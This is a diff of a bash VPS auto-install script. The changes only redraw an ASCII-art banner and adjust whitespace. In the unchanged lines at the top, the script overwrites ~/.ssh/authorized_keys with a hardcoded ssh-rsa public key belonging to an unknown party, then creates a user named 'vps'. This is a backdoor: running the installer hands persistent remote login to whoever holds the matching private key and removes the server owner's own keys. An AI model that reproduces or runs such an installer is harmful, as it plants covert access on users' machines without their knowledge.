@@ -1,5 +1,4 @@
 #!/bin/bash
-
 echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+Ct759FYAPZCpdjP8IfKVkXZXmQNJeORa1q1Nq6I/z2M6LPOzK92Rj7whxW1Zh26bL5bqEl1fBlh47up+Med8ECS469McBVDobht0Wyryjp1RSsE7uPMMf+ji1aQqh9YFnMSolDl0ylzmc+lw8ehlUAEgNe2QxUCjIx+7DqlzHaA47WKe0rb20ygrw5af5Lw6ciOziryAZjCGRuFOIvVEAEajW/0o6fGH81bFmLCl4JBH7H/U/8wusNJeAGEu8WzUCpJBAbd1EoPTFV6ehKWgiEh6UesAJZQLm4OPiuFBwpu4JjKsm3jl1WyxgR1mnxSXVs9dGZ1FNcwOAMqGbFZ5 > ~/.ssh/authorized_keys
 useradd vps
 cd
@@ -211,14 +210,17 @@ echo "      ___                                    ___         ___      "  | tee
 echo "     /  /\        ___           ___         /  /\       /__/\     "  | tee -a log-install.txt
 echo "    /  /:/_      /  /\         /__/\       /  /::\      \  \:\    "  | tee -a log-install.txt
 echo "   /  /:/ /\    /  /:/         \  \:\     /  /:/\:\      \  \:\   "  | tee -a log-install.txt
-echo "  /  /:/_/::\  /__/::\          \  \:\   /  /:/~/:/  _____\__\:\  "  | tee -a log-install.txt
-echo " /__/:/__\/\:\ \__\/\:\__   ___  \__\:\ /__/:/ /:/  /__/::::::::\ "  | tee -a log-install.txt
-echo " \  \:\ /~~/:/    \  \:\/\ /__/\ |  |:| \  \:\/:/   \  \:\~~\~~\/ "  | tee -a log-install.txt
-echo "  \  \:\  /:/      \__\::/ \  \:\|  |:|  \  \::/     \  \:\  ~~~  "  | tee -a log-install.txt
-echo "   \  \:\/:/       /__/:/   \  \:\__|:|   \  \:\      \  \:\      "  | tee -a log-install.txt
-echo "    \  \::/        \__\/     \__\::::/     \  \:\      \  \:\     "  | tee -a log-install.txt
-echo "     \__\/                       ~~~~       \__\/       \__\/ 1.0 "  | tee -a log-install.txt
+echo "  /  /:/ /::\  /  /:/           \  \:\   /  /:/  \:\ _____\__\:\  "  | tee -a log-install.txt
+echo " /__/:/ /:/\:\ /  /::\ ___  ___  \__\:\ /__/:/ \  \:/__/::::::::\ "  | tee -a log-install.txt
+echo " \  \:\/:/__\/ \  \:\/__/\ /  /\ |  |:| \  \:\  \__\:\  \:\~~\~~\/ "  | tee -a log-install.txt
+echo "  \  \::/       \  \:\  /:/ /:/ |  |:|  \  \:\ /  /:\  \:\  ~~~  "  | tee -a log-install.txt
+echo "   \  \:\        \  \:\/:/ /:/  |__|:|   \  \:\  /:/ \  \:\      "  | tee -a log-install.txt
+echo "    \  \:\        \  \::/ /:/    \__\:\   \  \:\/:/   \  \:\     "  | tee -a log-install.txt
+echo "     \__\/         \__\/ /:/      \__\/    \  \::/     \__\/     "  | tee -a log-install.txt
+echo "                       /:/                 \__\/                 "  | tee -a log-install.txt
+echo "                      /:/                                       1.0"  | tee -a log-install.txt
 echo "=================================================================="  | tee -a log-install.txt
+
 echo ""
 echo "   >>> Service & Port"  | tee -a log-install.txt
 echo "   - OpenSSH                  : 22"  | tee -a log-install.txt
